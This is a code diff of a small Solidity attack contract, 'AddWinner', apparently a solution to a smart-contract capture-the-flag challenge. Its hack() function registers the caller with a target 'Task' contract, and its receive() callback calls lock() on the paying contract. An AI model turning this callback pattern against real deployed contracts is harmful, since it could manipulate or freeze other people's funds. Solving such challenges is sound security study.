@@ -8,22 +8,11 @@ interface Task {
 }
 
 contract AddWinner {
-    address public immutable deployerAddr;
-
-    constructor() {
-        deployerAddr = msg.sender;
-    }
-
-    address target_contract;
-
     function hack(address target) external {
-        target_contract = target;
-        Task(target_contract).add(deployerAddr);
+        Task(target).add(msg.sender);
     }
 
     receive() external payable {
-        Task(target_contract).lock();
+        Task(msg.sender).lock();
     }
-
-    fallback() external {}
 }
